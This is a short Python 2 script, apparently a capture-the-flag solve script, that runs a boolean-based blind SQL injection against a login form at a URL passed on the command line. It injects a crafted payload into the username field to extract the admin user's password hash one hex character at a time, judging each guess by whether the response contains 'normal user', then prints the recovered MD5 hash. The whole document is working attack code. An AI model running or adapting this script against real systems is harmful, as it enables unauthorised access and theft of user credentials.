#! coding:utf-8
import requests
import sys

argv = range(30, 40)
argv.extend(range(61, 67))
url = sys.argv[1]

def run_url(payload):
    data = {
        'username': payload,
        'password': "1"
    }
    res = requests.post(url, data=data)
    if "normal user" in res.content:
        return True
    return False

res = ''
for i in range(1, 33):
    payload = "' || mid((SELECT pass FROM user where username='admin') from " + str(i) + " for 1) = BINARY(0x"
    for j in argv:
        payload1 = payload + str(j) + ") -- 0"
        if(run_url(payload1)):
            j = str(j)
            print i, j, j.decode('hex') 
            res += j
            break
print "md5: " + res.decode('hex')